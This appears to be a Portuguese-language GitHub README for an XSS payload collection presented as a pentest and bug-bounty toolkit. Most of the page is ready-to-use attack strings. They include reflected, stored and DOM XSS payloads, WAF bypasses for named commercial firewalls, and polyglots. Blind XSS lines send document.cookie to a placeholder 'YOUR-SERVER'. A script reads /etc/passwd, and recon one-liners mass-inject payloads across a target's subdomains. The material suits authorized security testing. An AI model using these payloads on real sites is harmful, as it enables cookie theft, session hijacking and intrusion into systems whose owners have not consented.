![XSS-Scripts Cover](<img width="1080" height="1080" alt="xss_cover" src="https://github.com/user-attachments/assets/91d32f53-38a6-427f-a3cf-4eb08d9a231a" />)

# XSS-SCRIPTS v2.0 — Cross-Site Scripting Arsenal

> **Desenvolvido por [HuntBox](https://huntbox.com.br) — Empresa 100% ofensiva de segurança.**

```
PAYLOADS. WAF BYPASS. RECON. EXPLORAÇÃO.
```

Coleção organizada de payloads XSS, técnicas de WAF bypass, one-liners de recon e scripts de exploração para pentests de aplicações web e programas de bug bounty.

---

## Módulos

| Módulo | Diretório | Descrição |
|--------|-----------|-----------|
| **Reflected XSS** | `payloads/reflected.md` | Payloads clássicos de reflexão em parâmetros |
| **Stored XSS** | `payloads/stored.md` | Persistência via input não sanitizado |
| **DOM-Based XSS** | `payloads/dom-based.md` | Exploração client-side via DOM manipulation |
| **Blind XSS** | `payloads/blind.md` | Callback payloads para execução out-of-band |
| **Polyglot** | `payloads/polyglot.md` | Payloads universais multi-contexto |
| **WAF Bypass** | `waf-bypass/` | Cloudflare, CloudFront, ModSecurity, Imperva |
| **Recon** | `recon/` | One-liners para discovery de endpoints vulneráveis |
| **Tools** | `tools/` | Integração com subfinder, airixss, bhedak, knoxss |

---

## Estrutura

```
XSS-scripts/
├── payloads/
│   ├── reflected.md
│   ├── stored.md
│   ├── dom-based.md
│   ├── blind.md
│   └── polyglot.md
├── waf-bypass/
│   ├── cloudflare.md
│   ├── cloudfront.md
│   ├── modsecurity.md
│   └── imperva.md
├── recon/
│   └── one-liners.md
├── tools/
│   ├── subfinder-xss.md
│   ├── airixss.md
│   ├── bhedak.md
│   ├── hakrawler.md
│   └── knoxss.md
└── techniques/
    ├── json-bypass.md
    ├── postmessage.md
    └── methodology.md
```

---

## Payloads — Quick Reference

### Reflected XSS

```html
"><script>alert('XSS')</script>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
<svg onload=alert(1)//
"><img src=x onerror=alert('XSS');>
<textarea autofocus onfocus=alert(1)>
<script href=data:,alert(1) />
```

### Stored XSS

```html
<a href="javascript:alert(document.cookie)">click me</a>
<img src=x onerror=alert(document.cookie)>
```

### DOM-Based XSS

```html
#"><img src=/ onerror=alert(2)>
```

### Blind XSS

```html
"><script src=https://YOUR-SERVER></script>
<img src=x onerror=document.body.appendChild(document.createElement('script')).src='https://YOUR-SERVER'>
<details open ontoggle="new Image().src='https://YOUR-SERVER?c='+document.cookie">
<iframe srcdoc="<script src='https://YOUR-SERVER'></script>">
<marquee onstart="fetch('https://YOUR-SERVER?d='+document.cookie)">XSS</marquee>
```

### SSRF via XSS

```html
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

---

## WAF Bypass

| WAF | Payload |
|-----|---------|
| **Cloudflare** | `<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ=="))>` |
| **Cloudflare** | `<svg/oNLY%3d1//On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>` |
| **CloudFront** | `<details/open/ontoggle=confirm('XSS')>` |
| **ModSecurity** | `<svg onload='new Function*["Y000!"].find(al\u0065rt)*'>` |
| **Imperva** | `<details x=xxX... 2 Open ontoggle=k&#x61;alert&#x28;origin)>` |

---

## Polyglot Payloads

```
JavaScript://%250A/*?'/*\\'/*"/*\\"/*`/*\\`/*%26apos;)/*\<!--></Script/></textArea/>
</iFrame/></noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/
(confirm)(1)}//><Base/Href=//YOUR-SERVER-->
```

```
'"><Img Src=OnXSS OnError=(confirm)(1)>
```

```
'"><!--></Title/</Textarea/</Script/></Iframe><Details/Open/OnToggle=(confirm)(1)-->
```

---

## Recon One-Liners

```bash
# Subfinder + Wayback + XSS check
echo "target.com" | subfinder -silent -nc | waybackurls | \
egrep -iv '\.(jpg|jpeg|gif|css|png|js|woff|ico|pdf|svg|txt)' | \
grep -aE '=.*[<>]'

# Blind XSS via GAU
subfinder -d target.com | gau | bxss \
  -payload '"><script src=https://YOUR-SERVER></script>' \
  -header "X-Forwarded-For"

# DOM XSS — var extraction
assetfinder target.com | gau | \
egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif)' | while read url; do
  vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed 's/var //g')
  echo -e "$url\n$vars"
done
```

---

## Metodologia

```
1. Verificar reflexão → target.com/search?q=teststring
2. Testar balanceamento → ?q=teststring'">
3. Se < > encodados → próximo endpoint
4. Se NÃO encodados → testar payloads + bypass
5. Identificar WAF → usar bypass específico
6. Escalar: Reflected → Stored → Blind
```

---

## Severity Reference

| Tipo de XSS | Severity |
|-------------|----------|
| Stored XSS com execução automática | CRITICAL |
| Blind XSS com exfiltração de cookies/sessions | CRITICAL |
| Reflected XSS sem interação | HIGH |
| DOM-Based XSS | HIGH |
| Self-XSS (requer social engineering) | LOW |

---

## Tools Integradas

| Ferramenta | Uso |
|-----------|-----|
| **Subfinder** | Subdomain enumeration → pipeline XSS |
| **Airixss** | Scan automatizado de reflected XSS |
| **Bhedak** | Fuzzing de parâmetros para XSS |
| **Hakrawler** | Crawl + discovery de endpoints |
| **KNOXSS** | Validação online de XSS |
| **xss-payloads-generator** | Geração automatizada de payloads |

---

## Aviso Legal

Use somente em **engagements autorizados**. O uso em sistemas sem autorização é ilegal.

---

<div align="center">

**Desenvolvido por [HuntBox](https://huntbox.com.br)**
*Empresa 100% ofensiva — Pentest • Red Team • Bug Bounty*

</div>
